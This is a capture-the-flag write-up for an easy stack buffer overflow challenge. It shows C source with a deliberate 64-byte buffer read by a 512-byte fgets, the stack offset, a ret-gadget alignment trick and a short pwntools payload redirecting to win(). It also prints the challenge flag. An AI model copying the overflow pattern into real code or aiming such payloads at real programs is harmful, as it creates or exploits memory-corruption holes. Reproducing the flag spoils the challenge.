# The Floor is Lava - Writeup

**Category:** Exploit
**Difficulty:** Easy
**Flag:** `poctf{uwsp_17_w45n7_3v3n_w0r7h_17}`

## Challenge Description

Classic stack buffer overflow challenge. The binary contains a `win()` function at address `0x4011f6` that reads and prints the flag. Our goal is to redirect execution to this function.

## Vulnerability Analysis

### Source Code Review

The vulnerability is in the main function:

```c
int main(void){
    setvbuf(stdout, NULL, _IONBF, 0);
    char buf[64];
    // ... prompts ...
    if(!fgets(buf, 512, stdin)) return 0;   /* intentional overflow */
    printf("You said: %s", buf);
    return 0;
}
```

**The Bug:** `buf` is only 64 bytes, but `fgets` reads up to 512 bytes, allowing us to overflow the buffer and overwrite the return address on the stack.

### Stack Layout

Using GDB, I determined the stack layout:
- Buffer: 64 bytes at `rbp-0x40`
- Saved RBP: 8 bytes
- Return address: 8 bytes at `rbp+0x8`

**Total offset to return address:** 72 bytes (64 + 8)

### Stack Alignment Issue

In x86-64 architecture, the stack must be 16-byte aligned before `call` instructions. When directly jumping to `win()`, the stack is misaligned, causing a segmentation fault in library functions.

**Solution:** Use a RET gadget before calling `win()` to align the stack.

## Exploitation

### Payload Structure

```
[72 bytes of padding] + [ret gadget address] + [win() address]
```

- **Padding:** 72 'A' bytes to reach the return address
- **RET Gadget:** `0x40101a` - aligns the stack by popping one value
- **Win Address:** `0x4011f6` - the function that prints the flag

### Exploit Code

See [stack_overflow_exploit.py](stack_overflow_exploit.py) for the complete exploit.

Key parts:
```python
offset = 72
payload = b'A' * offset
payload += p64(0x40101a)  # ret gadget for alignment
payload += p64(0x4011f6)  # win() function
```

## Flag

`poctf{uwsp_17_w45n7_3v3n_w0r7h_17}`

## Tools Used

- GDB with MCP for debugging and finding the exact offset
- pwntools for exploit development
- objdump for disassembly and finding gadgets
